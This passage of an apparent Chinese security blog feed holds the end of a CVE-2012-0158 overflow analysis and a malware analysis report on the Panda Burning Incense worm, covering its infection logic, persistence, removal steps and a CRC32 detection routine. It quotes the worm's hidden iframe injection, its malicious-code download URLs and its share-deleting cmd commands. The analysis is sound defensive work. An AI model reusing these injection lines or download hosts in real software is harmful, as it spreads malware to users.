<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        HeapFree(hHeap, <span class="number">0</span>, (LPVOID)lpMema);</span><br><span class="line">        result = v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = <span class="number">-2147024882</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">-2147418113</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分部来看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">275e7015 e8ad19feff      call    MSCOMCTL!DllGetClassObject+0x41c83 (275c89c7)</span><br></pre></td></tr></table></figure></p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/7.png?x-oss-process=style/yangruiqi.com" alt="7"></p><p>首先分配20个字节空间    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">275C89CA sub     esp, 14h        ; 分配20字节局部空间</span><br></pre></td></tr></table></figure><p>然后调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">275C89DA call    sub_275C876D</span><br></pre></td></tr></table></figure><p>这个call的功能是从样本读取dwBytes，这里是0CH字节返回到eax指向的内存地址。</p><p>关键call就是sub_275C876，进去看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:275C877C lea     ecx, [ebp+var_4]</span><br><span class="line">.text:275C877F push    4</span><br><span class="line">.text:275C8781 push    ecx</span><br><span class="line">.text:275C8782 push    ebx</span><br><span class="line">.text:275C8783 call    dword ptr [eax+0Ch]</span><br><span class="line">.text:275C8786 cmp     eax, esi</span><br><span class="line">.text:275C8788 jl      short loc_275</span><br></pre></td></tr></table></figure><p>读取4个字节到[ebp+var_4]，返回值和0比较，如果小于0，读取失败，转到失败处理，否则<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/8.png?x-oss-process=style/yangruiqi.com" alt="8"><br>分配0x8282字节空间，接着<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/CVE-2012-0158/9.png?x-oss-process=style/yangruiqi.com" alt="9"></p><p>我们看到：275C87CB rep movsd此时edi就是前面读取的0x8082字节，然后复制过去，<br>返回值就是我们的shellcode；<br>ep movsd 所在的这层函数在溢出后能正常返回，上上层函数在返回时候才跳去执行shellcode。分析完成，我们看到其实漏洞发生的根本原因在于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:275C89F3 cmp     [ebp+dwBytes], 8</span><br><span class="line">.text:275C89F7 jb      loc_275D</span><br></pre></td></tr></table></figure><p>比较从样本读取过来的数据时候处理错误，这里应该是大于8个字节就转到错误处理，它写成了小于8个字节转到错误处理。而这个字节大小是我们可以控制的，所以当我们传递比如0x8282，那么程序就会读取样本相应位置可控的0x8282字节到堆空间，然后把这0x8282字节复制到0x127b7c地址，进而覆盖掉函数的返回地址，执行我们的shellcode。</p><h1 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h1><p>帖子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.52pojie.cn/thread-453723-1-1.html</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 报告 - CVE-2012-0158漏洞分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>熊猫烧香病毒分析报告</title>
      <link href="/2018/07/16/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/"/>
      <url>/2018/07/16/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</url>
      <content type="html"><![CDATA[<table><thead><tr><th>样本名</th><th>panda.exe</th></tr></thead><tbody><tr><td>作者</td><td>杨睿琦</td></tr><tr><td>时间</td><td>2018-07-10 14:53:05</td></tr><tr><td>平台</td><td>win7_sp1_enx86_office2013</td></tr></tbody></table><h1 id="样本概况"><a href="#样本概况" class="headerlink" title="样本概况"></a>样本概况</h1><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><table><thead><tr><th>病毒名称</th><th>2_dump_SCY.exe</th></tr></thead><tbody><tr><td>所属家族</td><td>熊猫烧香</td></tr><tr><td>样本名称</td><td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td></tr><tr><td>样本类型</td><td>MS-DOS executable</td></tr><tr><td>样本大小</td><td>98816byte</td></tr><tr><td>MD5</td><td>b8f8e75c9e77743a61bbea9ccbcffd5d</td></tr><tr><td>SHA1</td><td>188fc8fc580c0ea4bf8a8900a3d36471823c8923</td></tr><tr><td>SHA256</td><td>0c15096fb3bc30800f7af002c25953162b799391300a62b8507fe8e4f6532768</td></tr><tr><td>SSDeep</td><td>3072:apAja0pSLwYqK6hVZ7N4bdq4a53YKCOTpc:a2ja0pShqK65ZOq4QYK1m</td></tr><tr><td>CRC32</td><td>E63D45D3</td></tr><tr><td>病毒行为</td><td>设置注册表实现自启动</td></tr><tr><td>病毒行为</td><td>修改资源管理器（explorer）的文件夹的隐藏属性</td></tr><tr><td>病毒行为</td><td>有将进程的内存属性修改为可执行或可写</td></tr><tr><td>病毒行为</td><td>向系统服务发送控制码</td></tr><tr><td>病毒行为</td><td>修改注册表自启动</td></tr><tr><td>病毒行为</td><td>枚举进程</td></tr><tr><td>病毒行为</td><td>结束杀软进程</td></tr><tr><td>病毒行为</td><td>删除安全软件相关启动项</td></tr><tr><td>病毒行为</td><td>删除服务</td></tr><tr><td>病毒行为</td><td>复制自身</td></tr><tr><td>病毒行为</td><td>感染PE文件</td></tr><tr><td>病毒行为</td><td>覆写PE文件</td></tr></tbody></table><h2 id="1-2-测试环境及工具"><a href="#1-2-测试环境及工具" class="headerlink" title="1.2 测试环境及工具"></a>1.2 测试环境及工具</h2><p>Process Monitor、火绒剑、OD、IDA、MD5工具、Win7</p><h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3 分析目标"></a>1.3 分析目标</h2><p>分析此病毒的恶意行为，达到了解和解析此病毒。</p><h1 id="2．具体行为分析"><a href="#2．具体行为分析" class="headerlink" title="2．具体行为分析"></a>2．具体行为分析</h1><p>分析此病毒的恶意行为，首先我们用微步沙箱分析下此病毒<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/1.png?x-oss-process=style/yangruiqi.com" alt="1"></p><p>发现了共2个进程<br>2_dump_SCY.exe(PID:3432)<br>“C:\Users\vbccsb\AppData\Local\Temp\2_dump_SCY.exe”<br>spo0lsv.exe(PID:3612)<br>C:\Windows\system32\drivers\spo0lsv.exe<br>然后做了如图中的行为。<br>使用IDA和OD结合观察。发现了此程序分为3个重要的CALL。如下：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/2.png?x-oss-process=style/yangruiqi.com" alt="2"></p><p>病毒的主要行为分三部分：<br>第一部分（自我保护与自我复制）：<br>复制自身到系统目录<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/3.png?x-oss-process=style/yangruiqi.com" alt="3"><br>第二部分（感染部分）：<br>感染全盘（本地）、定时器感染全盘（本地）、局域网感染（联网）<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/4.png?x-oss-process=style/yangruiqi.com" alt="4"><br>第三部分(病毒自我保护)：<br>设置注册表、停止杀软、网站下载代码并执行，就是下图6个定时器部分   </p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/5.png?x-oss-process=style/yangruiqi.com" alt="5"></p><p>最后是熊猫烧香的整体执行流程<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/6.png?x-oss-process=style/yangruiqi.com" alt="6"></p><h2 id="2-1-主要行为"><a href="#2-1-主要行为" class="headerlink" title="2.1 主要行为"></a>2.1 主要行为</h2><h3 id="2-1-1-恶意程序对用户造成的危害"><a href="#2-1-1-恶意程序对用户造成的危害" class="headerlink" title="2.1.1 恶意程序对用户造成的危害"></a>2.1.1 恶意程序对用户造成的危害</h3><p>(这里详细描述分析的步骤以及每一个行为的关键代码以及整体流程图)<br>首先在虚拟机里运行下病毒，用Process Monitor简单观察进程树，看看有什么行为查看到如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/7.png?x-oss-process=style/yangruiqi.com" alt="7"><br>系统启动之后，在进程树中可以发现，“2_dump_SCY.exe”衍生出了spo01sv.exe，spo01sv.exe进程打开了两次“cmd.exe”。第一次运行的命令是cmd.exe /c net share C$ /del /y，它的意思是在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为虚拟机只有一个C盘，因此有理由相信，这个病毒应该是会关闭系统中所有的盘的网络共享。一个是cmd.exe /c net share admin$ /del /y，这里取消的是系统根目录的共享。那么由此就可以总结出病毒的两点行为。所以根据这些操作总结出病毒两点行为：<br><strong>病毒行为1</strong>：病毒本身创建了名为“spoclsv.exe”的进程，该进程文件的路径为：C:\Windows\system32\drivers\spo0lsv.exe<br><strong>病毒行为2</strong>：在命令行模式下使用net share命令来取消系统中的共享。<br>先查看下2_dump_SCY.exe的行为，运用过滤器，先查看下Operation的CreateFile，发现在C:\Windows\system32\drivers\spo0lsv.exe。其他注册表之类的没有发现什么异常，所以推测spo0lsv.exe是真正做坏事的进程，下面监控spo0lsv.exe，查看下其对于注册表的删除，使用RegDeleteValue，发现他删除了很多在CurrentVersion/Run下的东西，都是杀毒软件的自启动项如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/8.png?x-oss-process=style/yangruiqi.com" alt="8"><br>所以<strong>病毒行为3</strong>：删除安全软件在注册表中的自启动项。再查看下创建了哪些键值，设置了哪些值，过滤RegCreateKey和RegSetValue，如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/9.png" alt="9"><br>发现在Run/svcshare,所以发现<strong>病毒行为4</strong>：设置开机病毒自启动，以及<strong>病毒行为5</strong>：设置隐藏的文件无法通过普通的设置显示，另外通过滤文件创建，发现<strong>病毒行为6</strong>：将自身文件拷贝到C盘，创建Desktop_.ini,如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/10.png?x-oss-process=style/yangruiqi.com" alt="10"><br>然后看网络部分，发现<strong>病毒行为7</strong>：一直在连接网络收发包。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/11.png?x-oss-process=style/yangruiqi.com" alt="11"><br>观察感染后的文件<strong>病毒行为8</strong>：发现感染PE文件后，会在文件的末尾写上标志，格式为：<br>WhBoy+ 源文件名 + “.exe” + 0x2标记+源文件大小+0x1标记<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/12.png?x-oss-process=style/yangruiqi.com" alt="12"></p><h2 id="2-2-恶意代码分析"><a href="#2-2-恶意代码分析" class="headerlink" title="2.2 恶意代码分析"></a>2.2 恶意代码分析</h2><h3 id="2-2-1-病毒主逻辑"><a href="#2-2-1-病毒主逻辑" class="headerlink" title="2.2.1 病毒主逻辑"></a>2.2.1 病毒主逻辑</h3><p>病毒的行为总体分为3个逻辑块，首先第一个部分就是病毒复制自身到系统目录名字为spcolsv.exe，然后运行起来，关闭当前病毒的运行进程。   </p><h3 id="2-2-2-恶意程序的代码分析片段"><a href="#2-2-2-恶意程序的代码分析片段" class="headerlink" title="2.2.2 恶意程序的代码分析片段"></a>2.2.2 恶意程序的代码分析片段</h3><h4 id="2-2-2-1-病毒解密校验部分"><a href="#2-2-2-1-病毒解密校验部分" class="headerlink" title="2.2.2.1 病毒解密校验部分"></a>2.2.2.1 病毒解密校验部分</h4><p>首先病毒会进行两次加密字符串的解密，一次“xboy”，一次“whboy”，两次都成功才会进入核心功能。这里的需要解密的代码就是boyx4个字母分别除A然后余数跟加密过的代码循环做异或，就得到了真正的密码。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/13.png?x-oss-process=style/yangruiqi.com" alt="13">   </p><h4 id="2-2-2-2-病毒创建和运行部分"><a href="#2-2-2-2-病毒创建和运行部分" class="headerlink" title="2.2.2.2 病毒创建和运行部分"></a>2.2.2.2 病毒创建和运行部分</h4><p>主体的第一个部分就是call sub_40819C，此部分主要就是病毒复制自身到系统目录下，名字为spcolsv.exe。<br>分部的步骤如下：<br>先检查下当前进程文件目录下是否有一个叫Desktop.ini的文件，反汇编代码如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/14.png?x-oss-process=style/yangruiqi.com" alt="14"><br>如果有的话去删除这个文件。然后进入新的流程。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/15.png?x-oss-process=style/yangruiqi.com" alt="15"><br>然后将病毒信息存放到之前申请的内存中，包括暴力破解的字典等，然后设置ZF位为1，目的是感染其他文件。<br>接着进行编辑检查工作，以判断病毒程序是否被多次运行，设置相关标记信息。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/16.png?x-oss-process=style/yangruiqi.com" alt="16"><br>接着进行判断，判断当前进程是否是第一次，执行，如果不是第一次就判断是否是伪装好的目录<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/17.png?x-oss-process=style/yangruiqi.com" alt="17"><br>如果当前进程不是Windows\system32\drivers\spo0lsv.exe，就将病毒文件改为spo0lsv.exe后复制到~\Windows\system32\drivers\spolsv.exe。然后运行起来复制过去的病毒样本，关闭当前病毒进程。这部分反汇编如下：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/18.png?x-oss-process=style/yangruiqi.com" alt="18"><br>如果当前进程是Windows\system32\drivers\spo0lsv.exe，说明病毒不是第一次运行并且已经伪装好了。会执行如下代码<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/19.png?x-oss-process=style/yangruiqi.com" alt="19"><br>这段代码释放之前申请的用于存放病毒文件信息的内存从，获取标记信息。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/20.png?x-oss-process=style/yangruiqi.com" alt="20"><br>这段代码主要是获取标记并今夕检查，标记为1时，进入的流程是被感染的程序loc_408477。下面分析下感染的过程。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/21.png?x-oss-process=style/yangruiqi.com" alt="21"><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/22.png?x-oss-process=style/yangruiqi.com" alt="22"><br>这段主要功能是将被感染的文件进行分离，提取出原始文件信息，由于感染文件结构是：病毒代码+原始代码+标记信息，最后保存的是标记信息，通过这些信息可以得到原始文件。所以上述代码执行之后会在程序所在目录释放出一个原始文件。<br>当创建完原始文件之后，就创建和运行批处理文件代码如下<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/23.png?x-oss-process=style/yangruiqi.com" alt="23"><br>总得来说就是先删除源文件，然后把感染的文件改名为原文件的名字。然后进行遍历在运行的进程，如果进程中不存在“spcolsv.exe”,则从病毒文件中分离出病毒程序，重新执行，累死与之前的代码。<br>这就是病毒创建和运行部分，可以总结得出，被感染文件的主要工作室文虎进程中伪造的病毒程序，“spcolsv.exe”,如果这个病毒被处理掉，则由被感染的程序再次生成，这样病毒的生命力会变得很顽强，只有修复了所以被感染的程序才能将其杀死。</p><h4 id="2-2-2-3-病毒感染部分"><a href="#2-2-2-3-病毒感染部分" class="headerlink" title="2.2.2.3 病毒感染部分"></a>2.2.2.3 病毒感染部分</h4><p>病毒的感染部分是病毒的核心部分。下面就来分析这个模块的相关操作。首先这个病毒通过3种方式进行感染，前面两种是本地进行病毒感染，第三种是通过网络传染病毒。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/24.png?x-oss-process=style/yangruiqi.com" alt="24"><br>然后分析第一个创建感染线程的回调函数。在其中遍历盘符数目，并且通过一个函数进入到驱动器中，遍历所有可感染文件以复制病毒，如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/25.png?x-oss-process=style/yangruiqi.com" alt="25"><br>这段代码主要是遍历了驱动器下的文件信息，将文件和文件夹进行了分类，排除了特殊文件夹，查询到是非特殊文件夹时， 病毒要进行感染操作，具体分析如下图。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/26.png?x-oss-process=style/yangruiqi.com" alt="26"><br>这段主要作用是执行了感染前的检查工作，若被感染了则继续遍历，如果没有被感染则修改DeskTop_.ini文件，写入感染时间。返回上面“004093E30”处继续循环处，继续循环遍历。当查找到时文件属性是，会跳转到00409BFC，对文件感染，相关代码如下图：<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/27.png?x-oss-process=style/yangruiqi.com" alt="27"><br>这段代码对文件进行检查，查看后缀是否是“GHO”，就判断是恢复文件，直接删除，防止用户还原系统。<br>一旦删除了系统备份文件，病毒就进入了感染操作。感染分为2种，感染本地文件种类和与感染网络相关的文件。<br>然后我们排除setup.exe和NTDETECT.COM,开始感染，然后判断是不是exe，是的话感染函数如下：<br>首先判断是不是正在运行，如果正在运行则放弃感染，再判断与病毒是否在同一个路径下，是则退出感染。然后读取将要被感染的文件到内存中，查看文件中是否有“Whboy”的标志，如果有则放弃感染，然后就是如下代码，如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/28.png?x-oss-process=style/yangruiqi.com" alt="28"><br>上述代码就是复制病毒程序主体文件，覆盖要被感染的文件，如果复制成功就继续感染，失败则退出感染。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/29.png?x-oss-process=style/yangruiqi.com" alt="29"><br>然后上图代码就是最后的操作，再最后添加标记“Whboy”+“源文件名”+0x2+“文件大小”+0x1,。这个就是感染本地运行程序的相关代码。<br>下面分析Inject，根据火绒剑和010editor观察，就是在文件最后写入字符串<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://www.krvkr.com/worm.htm width=0 height=0&gt;&lt;/ifame&gt;&gt;</span><br></pre></td></tr></table></figure></p><p>。<br>其次有两个端口135,80<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/30.png?x-oss-process=style/yangruiqi.com" alt="30"><br>下面分析最后一个程序定时器感染，首先进入这个函数可以看到<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/31.png?x-oss-process=style/yangruiqi.com" alt="31"><br>一共创建了6个定时器。每个定时器作用分别是：   </p><ol><li>sub_40CEE4,添加启动项，修改注册表。   </li><li>sub_40D040,下载恶意代码。   </li><li>sub_40D048,下载恶意代码，执行cmd命令。   </li><li>sub_406E44,删除杀毒软件启动项，关闭杀毒软件服务。   </li><li>sub_40CC4C,打开解密之后的网页。   </li><li><p>sub_40C728,下载恶意代码。<br>下面来详细分析这几个定时器。<br>第一个定时器sub_40CEE4,添加启动项，修改注册表。定时器的分析代码如下。<br>首先由如下代码<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/32.png?x-oss-process=style/yangruiqi.com" alt="32"><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/33.png?x-oss-process=style/yangruiqi.com" alt="33"><br>这里是添加特权。    </p><p>其次定时器回调里有一个函数   </p></li></ol><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/34.png?x-oss-process=style/yangruiqi.com" alt="34"></p><p>这里就是关闭一些进程。代码如下通过发消息，WM_QUIT来关闭。<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/35.png?x-oss-process=style/yangruiqi.com" alt="35"><br>发现首先拼接了个字符串，”svcshare”, “Software\Microsoft\Windows\CurrentVersion\Run”,所以在做的操作就是修改注册表，将病毒设置为启动项。另外”SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue”，设置隐藏的文件无法通过普通的设置显示。<br>下面分析第二个定时器sub_40D040,下载恶意代码。<br>第二个定时器回调函数里，创建了一个线程，然后从网站<a href="http://www.ac86.cn/66/up.txt下载恶意代码，关键代码如下图" target="_blank" rel="noopener">http://www.ac86.cn/66/up.txt下载恶意代码，关键代码如下图</a><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/36.png?x-oss-process=style/yangruiqi.com" alt="36"><br>首先观察代码，第三个定时器创建了两个线程，并且kill了定时器。下面我们先开第一个线程的回调函数，这个线程的回调就跟第二个定时去世一个回调函数sub_40C9B0,所以功能一样，都是从<a href="http://www.ac86.cn/66/up.txt下载恶意代码，然后观察第二个线程。" target="_blank" rel="noopener">http://www.ac86.cn/66/up.txt下载恶意代码，然后观察第二个线程。</a><br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/37.png?x-oss-process=style/yangruiqi.com" alt="37"><br>发现这个线程的作用是执行cmd命令cmd.exe /c net share C$ /del /y，在命令行模式下删除C盘的网络共享，执行完后关闭cmd.exe。因为虚拟机只有一个C盘，因此有理由相信，这个病毒应该是会关闭系统中所有的盘的网络共享。一个是cmd.exe /c net share admin$ /del /y，这里取消的是系统根目录的共享。<br>下面观察第四个定时器sub_406E44,删除杀毒软件启动项，关闭杀毒软件服务。如下图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/38.png?x-oss-process=style/yangruiqi.com" alt="38"><br>目的是打开解密之后的网页。<br>第六个定时器sub_40C728,下载恶意代码。如图<br><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99/39.png?x-oss-process=style/yangruiqi.com" alt="39"><br>从<a href="http://update.whboy.net/worm.txt获取恶意代码。" target="_blank" rel="noopener">http://update.whboy.net/worm.txt获取恶意代码。</a><br>以上就是本病毒的具体分析。</p><h1 id="3-解决方案"><a href="#3-解决方案" class="headerlink" title="3. 解决方案"></a>3. 解决方案</h1><h2 id="3-1-提取病毒的特征，利用杀毒软件查杀"><a href="#3-1-提取病毒的特征，利用杀毒软件查杀" class="headerlink" title="3.1 提取病毒的特征，利用杀毒软件查杀"></a>3.1 提取病毒的特征，利用杀毒软件查杀</h2><p>3.1 提取病毒的特征，利用杀毒软件查杀<br>特征网络 ip：<br>（1）<a href="http://www.tom.com/" target="_blank" rel="noopener">www.tom.com/</a><br>（2）<a href="http://www.163.com/" target="_blank" rel="noopener">www.163.com/</a><br>（3）<a href="http://www.sohu.com/" target="_blank" rel="noopener">www.sohu.com/</a><br>（4）<a href="http://www.yahoo.com/" target="_blank" rel="noopener">www.yahoo.com/</a><br>（5）<a href="http://www.ac86.cn/66/up.txt" target="_blank" rel="noopener">www.ac86.cn/66/up.txt</a><br>特征字符串：<br>（1）WhBoy<br>（2） SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Ad<br>vanced\Folder\Hidden\SHOWALL\CheckedValue<br>（3）感谢艾玛,mopery,海色の月,对此木马的关注!~<br>（4）<code>uup2..uxe</code>tm/vhjnx.fdu/ nsm&amp;uyt<br>（5） =nb{end’w{g&gt;ispy&gt;,.ps~<em>bb?2’gm.12&amp;mmeb|’lwl’s<code></code>wi:&amp;9&amp;#ibmn<br>lw&lt;%4+:?.nb{end9<br>（6）d}tq;</em>&amp;tyld|l. lboy’blt.vj{l’|}| 可以通过本文最后的查杀或修复文件工具算法实现匹配特征值（CRC32 或字 符串）进行查杀，也可以使用相应查杀工具进行杀毒。    </p><h2 id="3-2-手工查杀步骤"><a href="#3-2-手工查杀步骤" class="headerlink" title="3.2 手工查杀步骤"></a>3.2 手工查杀步骤</h2><p>1、删除【C:\Windows\System32\drivers\spcolsv.exe】文件<br>2、删除【HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVer<br>sion\Run】键项的svcshare<br>3、删除每个盘符根目录下生成两个文件【autorun.inf和setup.exe】文件<br>4、设置【HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer<br>\Advanced\Folder\Hidden\SHOWALL】，CheckedValue的键值设置为1（显示隐藏文件）</p><h2 id="3-3工具查杀步骤或是查杀思路"><a href="#3-3工具查杀步骤或是查杀思路" class="headerlink" title="3.3工具查杀步骤或是查杀思路"></a>3.3工具查杀步骤或是查杀思路</h2><p>代码编写主要参考姜烨博客关于熊猫烧香查杀的编写。<br>在查杀病毒的技术中有一种方法类似于特征码查杀法，这种方法并不从病毒内提取特征码，而是计算病毒的散列值。利用这个散列值，就可以在查杀的过程中计算每个文件的散列，然后进行比较。这种方法简单易于实现，一般在病毒刚被发现时，在逆向分析前使用。常见的计算散列的算法有MD5、Sha-1以及CRC32等。<br>计算CRC32的算法如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">CRC32</span><span class="params">(BYTE* ptr,DWORD Size)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    DWORD crcTable[<span class="number">256</span>],crcTmp1;   </span><br><span class="line">    <span class="comment">//动态生成CRC-32表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        crcTmp1 = i;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">8</span>; j&gt;<span class="number">0</span>; j--)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (crcTmp1&amp;<span class="number">1</span>) crcTmp1 = (crcTmp1 &gt;&gt; <span class="number">1</span>) ^ <span class="number">0xEDB88320</span>L;</span><br><span class="line">            <span class="keyword">else</span> crcTmp1 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        crcTable[i] = crcTmp1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//计算CRC32值</span></span><br><span class="line">    DWORD crcTmp2= <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">    <span class="keyword">while</span>(Size--)</span><br><span class="line">    &#123;</span><br><span class="line">        